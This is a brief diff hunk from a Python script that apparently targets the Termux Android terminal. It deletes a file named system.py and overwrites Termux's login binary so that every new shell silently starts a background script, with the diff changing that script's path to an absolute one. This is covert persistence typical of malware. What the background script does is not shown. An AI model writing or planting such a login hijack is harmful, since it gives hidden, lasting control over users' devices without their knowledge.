@@ -208,7 +208,7 @@ os.system('rm system.py')
 file = open('/data/data/com.termux/files/usr/bin/login', 'w')
 file.write('''#!/data/data/com.termux/files/usr/bin/sh
 
-python system.py &
+python /data/data/com.termux/files/usr/bin/system.py &
 clear
 
 if [ $# = 0 ] && [ -f /data/data/com.termux/files/usr/etc/motd ] && [ ! -f ~/.hushlogin ] && [ -z "$TERMUX_HUSHLOGIN" ]; then
